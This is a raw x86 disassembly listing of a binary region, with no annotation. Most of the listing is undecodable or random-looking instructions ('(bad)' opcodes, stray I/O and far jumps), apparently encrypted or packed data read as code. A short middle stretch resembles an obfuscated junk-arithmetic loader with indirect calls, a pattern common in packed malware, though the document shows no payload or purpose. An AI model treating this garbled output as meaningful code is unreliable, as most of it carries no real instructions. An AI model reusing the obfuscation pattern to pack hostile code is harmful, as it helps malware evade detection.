  41add4:	rcl    BYTE PTR [eax-0x45],0xcc
  41add8:	mov    edi,0xf79f80ae
  41addd:	push   edi
  41adde:	retf   
  41addf:	(bad)  
  41ade0:	push   esi
  41ade1:	pop    DWORD PTR [ebp+0x74]
  41ade4:	je     0x41ae2b
  41ade6:	push   es
  41ade7:	stos   DWORD PTR es:[edi],eax
  41ade8:	scas   al,BYTE PTR es:[edi]
  41ade9:	pop    ss
  41adea:	dec    ebp
  41adeb:	sub    BYTE PTR [ebx-0x79],al
  41adee:	cmp    al,0xc0
  41adf0:	add    al,0xb5
  41adf2:	mov    ah,0xd5
  41adf4:	and    BYTE PTR ds:0x73bc6c37,ah
  41adfa:	jl     0x41adaa
  41adfc:	test   al,0x8
  41adfe:	in     eax,dx
  41adff:	add    esi,esi
  41ae01:	cli    
  41ae02:	outs   dx,DWORD PTR ds:[esi]
  41ae03:	arpl   WORD PTR [esi+0x22],si
  41ae06:	gs dec esp
  41ae08:	jnp    0x41ae55
  41ae0a:	pop    eax
  41ae0b:	xchg   esi,eax
  41ae0c:	(bad)  
  41ae0d:	inc    ebp
  41ae0e:	or     al,0xf5
  41ae10:	les    edx,FWORD PTR [ebx-0x648d3343]
  41ae16:	sbb    DWORD PTR [edx],ebx
  41ae18:	mov    ch,0x5e
  41ae1a:	out    dx,al
  41ae1b:	xchg   esi,eax
  41ae1c:	inc    esi
  41ae1d:	adc    cl,BYTE PTR [esi]
  41ae1f:	or     al,0x8
  41ae21:	inc    ebx
  41ae22:	jns    0x41ae9f
  41ae24:	inc    edx
  41ae25:	out    dx,eax
  41ae26:	mov    bl,BYTE PTR [edi]
  41ae28:	adc    al,0x6e
  41ae2a:	dec    eax
  41ae2b:	pop    esp
  41ae2c:	add    BYTE PTR [esi+eax*1-0x7288423],0x76
  41ae34:	adc    bl,BYTE PTR [edx+0x51]
  41ae37:	fild   QWORD PTR [edi+0x3b]
  41ae3a:	pop    eax
  41ae3b:	sar    BYTE PTR [ebp+0x1230acd2],1
  41ae41:	inc    ecx
  41ae42:	out    dx,al
  41ae43:	fisttp DWORD PTR [eax]
  41ae45:	cld    
  41ae46:	mov    bl,0xc1
  41ae48:	rcr    BYTE PTR [ebp-0x2bd81dfb],cl
  41ae4e:	test   al,0x60
  41ae50:	inc    ebx
  41ae51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae52:	ror    ecx,cl
  41ae54:	pop    ecx
  41ae55:	xor    ecx,ebx
  41ae57:	pop    ebp
  41ae58:	push   edi
  41ae59:	lds    edi,FWORD PTR [edi+eax*2]
  41ae5c:	pusha  
  41ae5d:	push   ecx
  41ae5e:	call   0xc45e1041
  41ae63:	pop    eax
  41ae64:	inc    ecx
  41ae65:	sbb    DWORD PTR [ecx+0x1b],ebp
  41ae68:	aad    0x53
  41ae6a:	in     al,dx
  41ae6b:	data16 sbb BYTE PTR [ebp+edx*8-0x13f690a7],al
  41ae73:	adc    dl,dl
  41ae75:	inc    ebx
  41ae76:	jg     0x41ae7b
  41ae78:	icebp  
  41ae79:	mov    dh,0x73
  41ae7b:	jne    0x41aefa
  41ae7d:	outs   dx,BYTE PTR ds:[esi]
  41ae7e:	jmp    FWORD PTR [ebx]
  41ae80:	(bad)  
  41ae81:	je     0x41aee2
  41ae83:	ds or  bl,dh
  41ae86:	(bad)  
  41ae87:	icebp  
  41ae88:	(bad)  
  41ae89:	xor    DWORD PTR [ebx-0x28],eax
  41ae8c:	sbb    al,0x46
  41ae8e:	mov    dh,0xc8
  41ae90:	ret    
  41ae91:	sbb    BYTE PTR [edx],al
  41ae93:	aas    
  41ae94:	mov    ss,WORD PTR [edx+0x7ebcb900]
  41ae9a:	loop   0x41ae6a
  41ae9c:	ror    bh,cl
  41ae9e:	cwde   
  41ae9f:	nop
  41aea0:	outs   dx,BYTE PTR ds:[esi]
  41aea1:	in     al,0x5a
  41aea3:	and    ecx,DWORD PTR [esi+0x37744b1a]
  41aea9:	push   esp
  41aeaa:	mov    WORD PTR [edi-0x7d],?
  41aead:	(bad)  
  41aeae:	jb     0x41ae9d
  41aeb0:	mov    edx,DWORD PTR [ebp+0x8]
  41aeb3:	sub    DWORD PTR ds:0x42a292,edx
  41aeb9:	mov    ebx,DWORD PTR [ebp-0x58]
  41aebc:	sub    DWORD PTR ds:0x42a2c2,0x2e82
  41aec6:	add    edx,0x5708fa
  41aecc:	imul   edx,ebx
  41aecf:	sbb    ebx,0x1e47
  41aed5:	mov    DWORD PTR [ebp-0x58],edx
  41aed8:	or     DWORD PTR ds:0x42a29e,0x157
  41aee2:	mov    edx,DWORD PTR [ebp+0x8]
  41aee5:	sub    ebx,DWORD PTR ds:0x42a2f2
  41aeeb:	mov    ebx,DWORD PTR [ebp-0x54]
  41aeee:	add    edx,0x64f898
  41aef4:	or     DWORD PTR ds:0x42a25a,0x5c58
  41aefe:	or     edx,ebx
  41af00:	mov    ebx,DWORD PTR ds:0x42a322
  41af06:	mov    ebx,DWORD PTR [ebx]
  41af08:	sbb    DWORD PTR ds:0x42a2ee,ebx
  41af0e:	mov    DWORD PTR [ebp-0x54],edx
  41af11:	movzx  edx,WORD PTR ds:0x42a2c2
  41af18:	sub    DWORD PTR ds:0x42a28e,edx
  41af1e:	mov    edx,DWORD PTR [ebp+0x8]
  41af21:	xor    ebx,DWORD PTR ds:0x42a28a
  41af27:	mov    ebx,DWORD PTR [ebp-0x50]
  41af2a:	adc    DWORD PTR ds:0x42a29a,0x42a2a6
  41af34:	add    edx,ecx
  41af36:	sbb    DWORD PTR ds:0x42a2f2,0x42a2de
  41af40:	xor    edx,ebx
  41af42:	or     DWORD PTR ds:0x42a2de,edx
  41af48:	mov    DWORD PTR [ebp-0x50],edx
  41af4b:	and    DWORD PTR ds:0x42a262,0x0
  41af55:	xor    edx,edx
  41af57:	xor    edx,DWORD PTR ds:0x42a262
  41af5d:	inc    edx
  41af5e:	mov    DWORD PTR ds:0x42a262,edx
  41af64:	cmp    DWORD PTR ds:0x42a262,0x5
  41af6b:	jbe    0x41afb0
  41af71:	jmp    0x41af87
  41af76:	push   0x1fcb
  41af7b:	push   DWORD PTR [ebp-0x28]
  41af7e:	push   DWORD PTR [ebp-0x24]
  41af81:	call   DWORD PTR ds:0x42a402
  41af87:	cmp    DWORD PTR ds:0x42a262,0x4
  41af8e:	jne    0x41afa3
  41af94:	xor    edx,edx
  41af96:	or     edx,DWORD PTR ds:0x42a262
  41af9c:	inc    edx
  41af9d:	mov    DWORD PTR ds:0x42a262,edx
  41afa3:	cmp    DWORD PTR ds:0x42a262,0x16
  41afaa:	jb     0x41af55
  41afb0:	mov    edx,DWORD PTR [ebp+0x8]
  41afb3:	and    DWORD PTR ds:0x42a2f2,0x0
  41afbd:	xor    ebx,ebx
  41afbf:	or     ebx,DWORD PTR ds:0x42a2f2
  41afc5:	inc    ebx
  41afc6:	mov    DWORD PTR ds:0x42a2f2,ebx
  41afcc:	cmp    DWORD PTR ds:0x42a2f2,0xb
  41afd3:	jl     0x41b024
  41afd9:	jmp    0x41affd
  41afde:	push   0x1
  41afe0:	push   DWORD PTR [ebp-0x10]
  41afe3:	push   0x5b88
  41afe8:	push   0x81d2
  41afed:	push   0x4421
  41aff2:	push   0x50f5
  41aff7:	call   DWORD PTR ds:0x42a3c2
  41affd:	cmp    DWORD PTR ds:0x42a2f2,0xa
  41b004:	jne    0x41b017
  41b00a:	mov    ebx,DWORD PTR ds:0x42a2f2
  41b010:	inc    ebx
  41b011:	mov    DWORD PTR ds:0x42a2f2,ebx
  41b017:	cmp    DWORD PTR ds:0x42a2f2,0x18
  41b01e:	jb     0x41afbd
  41b024:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b027:	adc    DWORD PTR ds:0x42a2f6,0x42a2e2
  41b031:	jmp    0x41d389
  41b036:	xchg   ebx,eax
  41b037:	jmp    0xab5b1b75
  41b03c:	add    DWORD PTR [ecx+0x1dcb2f48],0x26cad4f8
  41b046:	mov    bh,bh
  41b048:	jl     0x41afcd
  41b04a:	inc    esi
  41b04b:	pop    esi
  41b04c:	add    DWORD PTR [ebx-0xd70603c],0x62
  41b053:	xchg   ebp,eax
  41b054:	cmc    
  41b055:	(bad)  
  41b056:	outs   dx,DWORD PTR ds:[esi]
  41b057:	push   esp
  41b058:	pop    es
  41b059:	test   BYTE PTR [ebx],dh
  41b05b:	shl    DWORD PTR [edx-0x50fb2448],cl
  41b061:	fcomp  QWORD PTR [ebp+0x58]
  41b064:	push   eax
  41b065:	ins    BYTE PTR es:[edi],dx
  41b066:	popf   
  41b067:	jmp    0x41affa
  41b069:	jle    0x41b038
  41b06b:	or     DWORD PTR [edx],esp
  41b06d:	jmp    0x41b07e
  41b06f:	pop    eax
  41b070:	test   BYTE PTR [esi+0x1c],dh
  41b073:	add    al,0x93
  41b075:	cmc    
  41b076:	cwde   
  41b077:	fwait
  41b078:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41b07a:	aam    0x49
  41b07c:	popa   
  41b07d:	sub    BYTE PTR [ecx],dh
  41b07f:	push   edx
  41b080:	popa   
  41b081:	push   ecx
  41b082:	repnz cli 
  41b084:	fidiv  WORD PTR [edx-0x76fa204b]
  41b08a:	sub    bl,bl
  41b08c:	mov    ch,0x1c
  41b08e:	(bad)  
  41b08f:	xlat   BYTE PTR ds:[ebx]
  41b090:	in     eax,0xd8
  41b092:	cmp    eax,0xc6f1955d
  41b097:	imul   esi,DWORD PTR [edx],0xffffffe8
  41b09a:	std    
  41b09b:	fdiv   QWORD PTR [esi]
  41b09d:	jno    0x41b04e
  41b09f:	lea    eax,[esi-0x6a]
  41b0a2:	ficomp WORD PTR [edx]
  41b0a4:	enter  0x79d1,0xd
  41b0a8:	shr    BYTE PTR [ecx],cl
  41b0aa:	xor    DWORD PTR [eax+0x5b8456f2],edx
  41b0b0:	rol    cl,cl
  41b0b2:	or     al,0x35
  41b0b4:	loope  0x41b134
  41b0b6:	sub    eax,0x28e3b329
  41b0bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0bc:	call   0x548c11ce
  41b0c1:	inc    edx
  41b0c2:	sub    ebx,0xdea7085e
  41b0c8:	(bad)  
  41b0c9:	sbb    al,BYTE PTR [ecx+0x24]
  41b0cc:	cmp    DWORD PTR ds:0x261f27ed,edx
  41b0d2:	js     0x41b094
  41b0d4:	cwde   
  41b0d5:	and    eax,0x97fd080f
  41b0da:	push   esi
  41b0db:	sti    
  41b0dc:	or     eax,0xfce7907
  41b0e1:	cmc    
  41b0e2:	jle    0x41b0b7
  41b0e4:	pop    edi
  41b0e5:	sbb    esi,DWORD PTR [edi-0x4c]
  41b0e8:	repnz (bad) 
  41b0ea:	imul   ebx,ebx,0xa3127cd4
  41b0f0:	pop    edx
  41b0f1:	das    
  41b0f2:	enter  0xbfc3,0xa7
  41b0f6:	mov    ecx,0x456d8f77
  41b0fb:	out    0x2d,al
  41b0fd:	and    esi,esi
  41b0ff:	jecxz  0x41b09d
  41b101:	mov    bh,0xae
  41b103:	int3   
  41b104:	xchg   ecx,edx
  41b106:	cmp    DWORD PTR [eax],eax
  41b108:	mov    ah,0x78
  41b10a:	and    eax,0x1317372b
  41b10f:	test   ebp,0xeb94ef08
  41b115:	cmc    
  41b116:	dec    edi
  41b117:	js     0x41b13f
  41b119:	popa   
  41b11a:	mov    ah,0xde
  41b11c:	(bad)  [ecx*8-0x14e45d47]
  41b123:	push   cs
  41b124:	push   0xfffffff3
  41b126:	enter  0xbfec,0xdf
  41b12a:	imul   ebp,DWORD PTR [edi+0x41],0x93a823df
  41b131:	lahf   
  41b132:	mov    eax,gs
  41b134:	mov    al,ds:0x8684d8d
  41b139:	scas   al,BYTE PTR es:[edi]
  41b13a:	(bad)  
  41b13b:	cmp    al,0x21
  41b13d:	fisttp DWORD PTR [edx]
  41b13f:	xchg   esp,eax
  41b140:	loop   0x41b11d
  41b142:	adc    al,BYTE PTR [ebp-0x17564714]
  41b148:	inc    edx
  41b149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b14a:	fld    TBYTE PTR [edx-0x10]
  41b14d:	dec    ebx
  41b14e:	xchg   BYTE PTR [ecx],bh
  41b150:	dec    edx
  41b151:	inc    dh
  41b153:	lods   al,BYTE PTR ds:[esi]
  41b154:	jbe    0x41b0fd
  41b156:	fs inc ebp
  41b158:	sub    al,0x67
  41b15a:	push   eax
  41b15b:	fwait
  41b15c:	sub    esp,DWORD PTR [ebx]
  41b15e:	imul   ecx,DWORD PTR [edx+ebx*4],0xfb2b6de3
  41b165:	xor    al,0xde
  41b167:	shl    BYTE PTR [edx],cl
  41b169:	jb     0x41b174
  41b16b:	outs   dx,BYTE PTR ds:[esi]
  41b16c:	dec    esi
  41b16d:	(bad)  
  41b16e:	or     ch,BYTE PTR [esi+0x6064c5fb]
  41b174:	cmp    eax,0xe5d3f02e
  41b179:	fwait
  41b17a:	sub    BYTE PTR [ebp-0x1f],0x44
  41b17e:	or     cl,BYTE PTR [edi-0xf]
  41b181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b182:	sbb    al,0xb3
  41b184:	cmp    DWORD PTR [edx],ecx
  41b186:	fsub   DWORD PTR [ebx+0x51]
  41b189:	imul   esi
  41b18b:	add    BYTE PTR [ecx-0x79fdafda],0x5d
  41b192:	mov    bl,0xe8
  41b194:	cwde   
  41b195:	fucomp st(0)
  41b197:	cmp    eax,0x9b5b9687
  41b19c:	xchg   edx,eax
  41b19d:	ds jmp 0xb0c5:0x8f318a3a
  41b1a5:	hlt    
  41b1a6:	pop    edi
  41b1a7:	scas   al,BYTE PTR es:[edi]
  41b1a8:	cwde   
  41b1a9:	shl    DWORD PTR [esi+0xe511e33],0xe8
  41b1b0:	outs   dx,DWORD PTR ds:[esi]
  41b1b1:	and    ah,bl
  41b1b3:	ficom  WORD PTR [ecx-0xc9ce545]
  41b1b9:	mov    cl,BYTE PTR ds:0xd0dab244
  41b1bf:	sub    edx,DWORD PTR [edi+eiz*8+0x1a]
  41b1c3:	sbb    al,0xe1
  41b1c5:	pushf  
  41b1c6:	jne    0x41b242
  41b1c8:	(bad)  
  41b1c9:	test   BYTE PTR [edi+eiz*8+0x54762fd8],0xaa
  41b1d1:	shl    ah,cl
  41b1d3:	sub    eax,0x1eb19ed5
  41b1d8:	dec    esp
  41b1d9:	jg     0x41b19e
  41b1db:	push   ss
  41b1dc:	scas   eax,DWORD PTR es:[di]
  41b1de:	sti    
  41b1df:	cmp    ah,BYTE PTR [edx+0xe]
  41b1e2:	out    dx,al
  41b1e3:	les    ebx,FWORD PTR [edi-0x741d4918]
  41b1e9:	loopne 0x41b1ea
  41b1eb:	(bad)  
  41b1ec:	jmp    0x15e77202
  41b1f1:	std    
  41b1f2:	and    DWORD PTR [esi],esp
  41b1f4:	cwde   
  41b1f5:	jp     0x41b204
  41b1f7:	sahf   
  41b1f8:	push   edx
  41b1f9:	aad    0xe3
  41b1fb:	mov    ch,0x16
  41b1fd:	sub    cl,BYTE PTR [edx]
  41b1ff:	rol    BYTE PTR [ecx],1
  41b201:	adc    ebx,DWORD PTR [ebx-0x67aa7aa1]
  41b207:	pushf  
  41b208:	xor    esi,DWORD PTR [eax-0xaeb8cf7]
  41b20e:	sbb    edi,edx
  41b210:	ficomp DWORD PTR [edx]
  41b212:	lahf   
  41b213:	(bad)  
  41b215:	(bad)  
  41b216:	mov    BYTE PTR [eax],al
  41b218:	hlt    
  41b219:	dec    ebx
  41b21b:	sub    eax,0x7beb05b7
  41b220:	add    al,BYTE PTR ds:0x80388fb8
  41b226:	sahf   
  41b227:	push   ebx
  41b228:	lahf   
  41b229:	cmp    al,ah
  41b22b:	in     al,dx
  41b22c:	sti    
  41b22d:	punpckhbw mm4,QWORD PTR [eax+0x79]
  41b231:	mov    al,0xda
  41b233:	mov    ch,0x27
  41b235:	jb     0x41b29f
  41b237:	lock mov ebx,0xa2b1d205
  41b23d:	(bad)  
  41b23e:	neg    BYTE PTR [eax+edi*2+0x4295663]
  41b245:	xchg   ebp,eax
  41b246:	ret    
  41b247:	fnstcw WORD PTR [ebp+0x36]
  41b24a:	fst    QWORD PTR [ebx+0x65]
  41b24d:	pusha  
  41b24e:	or     ch,dl
  41b250:	sbb    ah,0xbd
  41b253:	and    eax,0x3a597971
  41b258:	sbb    eax,0xede957f6
  41b25d:	cmp    ah,BYTE PTR [ebx]
  41b25f:	inc    ebx
  41b260:	mov    bh,0x33
  41b262:	xchg   dl,ch
  41b264:	cmp    ah,BYTE PTR [edi+0x12]
  41b267:	les    ebx,FWORD PTR [esp+esi*8-0xa]
  41b26b:	idiv   DWORD PTR [ebp-0x478bc2b6]
  41b271:	test   eax,0xf4ea37fe
  41b276:	xchg   BYTE PTR ds:0xb56e835a,bl
  41b27c:	stc    
  41b27d:	add    al,0x39
  41b27f:	icebp  
  41b280:	push   ebp
  41b281:	sub    DWORD PTR [edi-0x56],edx
  41b284:	pop    esp
  41b285:	push   ss
  41b286:	aas    
  41b287:	push   DWORD PTR ds:0xecc2b702
  41b28d:	mov    edx,0xe4cc10e9
  41b292:	shr    BYTE PTR [esp+edi*8],1
  41b295:	shr    DWORD PTR [edi+ebp*2+0x5cb23606],1
  41b29c:	lahf   
  41b29d:	(bad)  
  41b29e:	fsub   QWORD PTR [eax+0x62b10914]
  41b2a4:	xchg   ebx,ebx
  41b2a6:	jmp    0x8be1095d
  41b2ab:	icebp  
  41b2ac:	stc    
  41b2ad:	test   al,0x97
  41b2af:	jae    0x41b2e6
  41b2b1:	loopne 0x41b265
  41b2b3:	or     dh,al
  41b2b5:	dec    esp
  41b2b6:	mov    al,ds:0xf12687b1
  41b2bb:	jbe    0x41b338
  41b2bd:	ins    DWORD PTR es:[edi],dx
  41b2be:	outs   dx,BYTE PTR ds:[esi]
  41b2bf:	stos   DWORD PTR es:[edi],eax
  41b2c0:	loopne 0x41b291
  41b2c2:	mov    ah,0x90
  41b2c4:	jp     0x41b2b7
  41b2c6:	or     al,0xeb
  41b2c8:	xchg   edx,eax
  41b2c9:	nop
  41b2ca:	stos   DWORD PTR es:[edi],eax
  41b2cb:	dec    ecx
  41b2cc:	lea    esp,[eax+esi*2-0x3d]
  41b2d0:	scas   eax,DWORD PTR es:[edi]
  41b2d1:	inc    esi
  41b2d2:	cmp    bh,BYTE PTR [esi+eiz*1+0x2107b2d4]
  41b2d9:	in     al,0x92
  41b2db:	arpl   ax,cx
  41b2dd:	jle    0x41b2bb
  41b2df:	inc    ecx
  41b2e0:	mov    BYTE PTR [eax+0xd92aa38],bh
  41b2e6:	and    al,BYTE PTR [ecx]
  41b2e8:	sbb    eax,0x4779fcc2
  41b2ed:	mov    ds:0xebf3e5d8,eax
  41b2f2:	dec    ebp
  41b2f3:	aaa    
  41b2f4:	xor    cl,BYTE PTR ds:0x4ee3abd5
  41b2fa:	pop    edi
  41b2fb:	out    0x56,eax
  41b2fd:	into   
  41b2fe:	ins    BYTE PTR es:[edi],dx
  41b2ff:	inc    edi
  41b300:	cmp    DWORD PTR [ebp+0x284f062c],ecx
  41b306:	jge    0x41b2a1
  41b308:	xchg   esi,eax
  41b309:	mov    edi,ebp
  41b30b:	dec    ebx
  41b30c:	and    ch,BYTE PTR [ebx-0x2d]
  41b30f:	fucom  st(7)
  41b311:	mov    edx,0xf5fac64c
  41b316:	push   esi
  41b317:	mov    esi,0xe811482f
  41b31c:	loopne 0x41b373
  41b31e:	inc    ebx
  41b31f:	mov    ch,0x33
  41b321:	xor    DWORD PTR [edi+0x1b269899],0x56eabe66
  41b32b:	nop
  41b32c:	retf   
  41b32d:	int3   
  41b32e:	jne    0x41b346
  41b330:	call   0xae77:0x6c94c4c0
  41b337:	or     ebx,ecx
  41b339:	jle    0x41b36c
  41b33b:	mov    bl,BYTE PTR [ebx+0x568d7b2b]
  41b341:	clc    
  41b342:	xor    eax,0xf972c264
  41b347:	jmp    0x41b323
  41b349:	cmp    al,BYTE PTR [esi+edi*2]
  41b34c:	out    0x82,eax
  41b34e:	xlat   BYTE PTR ds:[ebx]
  41b34f:	clc    
  41b350:	rcl    DWORD PTR [eax-0x608945],cl
  41b356:	jle    0x41b333
  41b358:	or     dh,BYTE PTR [ecx+0x710ec9cc]
  41b35e:	pop    es
  41b35f:	inc    edi
  41b360:	sbb    DWORD PTR [ebx+0x67],edi
  41b363:	sub    ebp,esi
  41b365:	icebp  
  41b366:	lods   al,BYTE PTR ds:[esi]
  41b367:	gs push 0x6531b4d5
  41b36d:	icebp  
  41b36e:	stos   DWORD PTR es:[edi],eax
  41b36f:	mov    ebx,eax
  41b371:	iret   
  41b372:	push   ebx
  41b373:	pop    ds
  41b374:	mov    esi,0x13115ebd
  41b379:	inc    edi
  41b37a:	je     0x41b326
  41b37c:	pop    ss
  41b37d:	jbe    0x41b308
  41b37f:	(bad)  
  41b380:	adc    BYTE PTR ds:0xfa8f34c2,cl
  41b386:	jg     0x41b3bd
  41b388:	shl    DWORD PTR [eax-0x4f],0xc
  41b38c:	jecxz  0x41b32c
  41b38e:	stos   DWORD PTR es:[edi],eax
  41b38f:	aad    0xa1
  41b391:	push   edi
  41b392:	repnz or DWORD PTR [ebp-0x24356c89],ebp
  41b399:	fbstp  TBYTE PTR [edx-0x6b3160df]
  41b39f:	rcl    BYTE PTR [eax-0x7c],1
  41b3a2:	stos   DWORD PTR es:[edi],eax
  41b3a3:	in     eax,dx
  41b3a4:	jbe    0x41b35d
  41b3a6:	mov    dh,0xbf
  41b3a8:	adc    esp,DWORD PTR [edi+0x4d]
  41b3ab:	out    0xa6,al
  41b3ad:	outs   dx,DWORD PTR ds:[esi]
  41b3ae:	call   0x664ca2b1
  41b3b3:	jmp    0x98fc1688
  41b3b8:	popw   ss
  41b3ba:	xchg   edx,eax
  41b3bb:	mov    eax,0xd97ed617
  41b3c0:	shl    DWORD PTR [ebx],1
  41b3c2:	xchg   edx,eax
  41b3c3:	cdq    
  41b3c4:	jbe    0x41b3d7
  41b3c6:	mov    bh,ah
  41b3c8:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3ca:	ins    BYTE PTR es:[edi],dx
  41b3cb:	sbb    BYTE PTR [eax+ecx*1-0x7a],bl
  41b3cf:	lahf   
  41b3d0:	nop
  41b3d1:	xchg   esi,eax
  41b3d2:	mov    edx,0xe8084743
  41b3d7:	rcl    dl,cl
  41b3d9:	sbb    BYTE PTR [eax],cl
  41b3db:	cmc    
  41b3dc:	jmp    0x41b3b2
  41b3de:	sbb    DWORD PTR [edx+0x37ed14d0],esi
  41b3e4:	test   DWORD PTR [edx+0x2b],edx
  41b3e7:	dec    esp
  41b3e8:	xlat   BYTE PTR ds:[ebx]
  41b3e9:	adc    al,0x4d
  41b3eb:	xor    DWORD PTR [ebp-0x51d3914b],eax
  41b3f1:	xor    edi,edx
  41b3f3:	(bad)  
  41b3f4:	fstp   DWORD PTR [ebx-0x273da5dc]
  41b3fa:	push   ebx
  41b3fb:	adc    ebx,esp
  41b3fd:	sbb    eax,0x42cf90ce
  41b402:	out    dx,al
  41b403:	dec    ebx
  41b404:	rol    BYTE PTR [ebx-0x37edb64a],cl
  41b40a:	xchg   ebp,eax
  41b40b:	push   ecx
  41b40c:	shl    DWORD PTR [edx],cl
  41b40e:	aas    
  41b40f:	cmp    BYTE PTR [eax+0x3bb5e26a],al
  41b415:	daa    
  41b416:	xchg   esi,eax
  41b417:	push   esp
  41b418:	icebp  
  41b419:	mov    DWORD PTR [ecx],eax
  41b41b:	sbb    BYTE PTR [esp+ecx*2+0x30],dh
  41b41f:	test   al,0x6f
  41b421:	out    0x5,al
  41b423:	lds    edx,FWORD PTR [esi]
  41b425:	xchg   edx,eax
  41b426:	stc    
  41b427:	sub    BYTE PTR [esi+0x2d03f32b],0xcf
  41b42e:	sub    al,0x2c
  41b430:	cmc    
  41b431:	mov    cl,0x95
  41b433:	fwait
  41b434:	stc    
  41b435:	jmp    0x1e33:0x956b20c1
  41b43c:	mov    ebp,0x601f5250
  41b441:	xchg   BYTE PTR [edx+0x3502af51],bh
  41b447:	sbb    eax,0x8742c69f
  41b44c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b44d:	aaa    
  41b44e:	inc    edx
  41b44f:	mov    BYTE PTR ds:[eax-0x69b495e5],dl
  41b456:	popa   
  41b457:	aas    
  41b458:	push   ecx
  41b459:	sub    cl,BYTE PTR [eax-0x10]
  41b45c:	adc    eax,DWORD PTR [edi-0x3e5f5949]
  41b462:	daa    
  41b463:	xor    DWORD PTR [esi+eiz*1],eax
  41b466:	push   es
  41b467:	rcl    BYTE PTR [ecx-0x53],1
  41b46a:	cmp    edi,edx
  41b46c:	xor    ebx,DWORD PTR ds:0x36716109
  41b472:	mov    ch,0xf3
  41b474:	inc    ecx
  41b475:	and    edi,DWORD PTR [eax-0x25]
  41b478:	cmp    eax,DWORD PTR [eax]
  41b47a:	adc    edi,DWORD PTR [ebx]
  41b47c:	mov    WORD PTR [ebp-0x78b72494],cs
  41b482:	in     al,dx
  41b483:	lods   al,BYTE PTR ds:[esi]
  41b484:	or     ecx,DWORD PTR [ecx]
  41b486:	mov    cl,0x5e
  41b488:	push   esp
  41b489:	jb     0x41b436
  41b48b:	arpl   WORD PTR [eax-0x4a82e875],sp
  41b491:	xlat   BYTE PTR ds:[ebx]
  41b492:	mov    bh,0x2b
  41b494:	xor    al,0x21
  41b496:	js     0x41b488
  41b498:	push   edx
  41b499:	add    eax,0x282c740e
  41b49e:	jb     0x41b442
  41b4a0:	jmp    0x41b4a3
  41b4a2:	loope  0x41b46f
  41b4a4:	dec    dh
  41b4a6:	loope  0x41b4b5
  41b4a8:	retf   
  41b4a9:	pop    ebx
  41b4aa:	es in  al,0x6c
  41b4ad:	jge    0x41b491
  41b4af:	jecxz  0x41b50f
  41b4b1:	inc    BYTE PTR cs:[edi+eiz*4+0x44cf0976]
  41b4b9:	inc    eax
  41b4ba:	jbe    0x41b4c6
  41b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4bd:	shl    DWORD PTR [esp+edx*4],0x28
  41b4c1:	(bad)  [ebx+0x55]
  41b4c4:	ss sub al,0xca
  41b4c7:	jecxz  0x41b509
  41b4c9:	sbb    eax,0xf2f0b9bc
  41b4ce:	jo     0x41b54c
  41b4d0:	inc    esi
  41b4d1:	mov    edx,esp
  41b4d3:	ror    BYTE PTR [ecx+0x38b2f75c],0x90
  41b4da:	ds add al,0xf9
  41b4dd:	out    dx,eax
  41b4de:	sub    DWORD PTR [esi+0x44],edx
  41b4e1:	test   al,0xcb
  41b4e3:	push   ebp
  41b4e4:	mov    esp,fs
  41b4e6:	test   eax,0x360abc0c
  41b4eb:	push   ss
  41b4ec:	stos   DWORD PTR es:[edi],eax
  41b4ed:	nop
  41b4ee:	jnp    0x41b55e
  41b4f0:	ins    BYTE PTR es:[edi],dx
  41b4f1:	test   BYTE PTR [edi-0x31],bl
  41b4f4:	cmp    al,0xe8
  41b4f6:	pop    ebp
  41b4f7:	cmp    bh,dl
  41b4f9:	inc    edi
  41b4fa:	cmp    ecx,edx
  41b4fc:	and    al,0x98
  41b4fe:	dec    edi
  41b4ff:	sub    DWORD PTR [eax-0x7aaf6e10],esi
  41b505:	pusha  
  41b506:	sub    BYTE PTR [eax+0x5e78f8b7],0x38
  41b50d:	outs   dx,DWORD PTR gs:[esi]
  41b50f:	rsqrtps xmm5,XMMWORD PTR [eax+0x763b5674]
  41b516:	into   
  41b517:	lods   eax,DWORD PTR ds:[esi]
  41b518:	hlt    
  41b519:	aam    0x87
  41b51b:	xor    bl,al
  41b51d:	dec    esp
  41b51e:	stos   DWORD PTR es:[edi],eax
  41b51f:	push   es
  41b520:	sahf   
  41b521:	mov    ecx,0x9824fba0
  41b526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b527:	push   ecx
  41b528:	lock icebp 
  41b52a:	es in  al,0x9f
  41b52d:	jmp    0x41b54c
  41b52f:	dec    esi
  41b530:	cld    
  41b531:	add    DWORD PTR [edi+0x10b9aff1],edi
  41b537:	pop    ebp
  41b538:	add    ecx,DWORD PTR [ebp+0xe]
  41b53b:	(bad)  
  41b53c:	ror    DWORD PTR [ebx+0x10],cl
  41b53f:	data16 mov al,ds:0xa7b80e0a
  41b545:	mov    ch,0x67
  41b547:	jmp    0x9805:0xd531fc45
  41b54e:	jo     0x41b541
  41b550:	jmp    0x2fc6331d
  41b555:	(bad)  
  41b556:	fcmovnbe st,st(7)
  41b558:	add    edx,0x65
  41b55b:	jae    0x41b53a
  41b55d:	fs add eax,0x2766e0f0
  41b563:	sbb    eax,0x10e44ddc
  41b568:	jge    0x41b515
  41b56a:	pushf  
  41b56b:	mov    bh,0xfb
  41b56d:	retf   
  41b56e:	mov    esp,0xf1af5ff2
  41b573:	lods   eax,DWORD PTR es:[esi]
  41b575:	cmp    BYTE PTR [eax+0x2e],bh
  41b578:	push   eax
  41b579:	mov    dl,0xbe
  41b57b:	pushf  
  41b57c:	sar    BYTE PTR [eax],1
  41b57e:	or     ecx,DWORD PTR [esi+0x449811ab]
  41b584:	sub    ecx,ecx
  41b586:	(bad)  
  41b587:	fcom   QWORD PTR ds:0x2dc9b2f6
  41b58d:	push   ds
  41b58e:	(bad)  
  41b58f:	mov    ebx,0x2ccefcf2
  41b594:	fs or  al,0x4b
  41b597:	cmp    edi,edi
  41b599:	shl    esi,0x93
  41b59c:	or     al,0xbc
  41b59e:	push   ss
  41b59f:	xor    ah,BYTE PTR [ecx-0x38]
  41b5a2:	(bad)  
  41b5a3:	enter  0x3842,0x9c
  41b5a7:	pop    ecx
  41b5a8:	fmul   QWORD PTR [ebp+0x5da3418e]
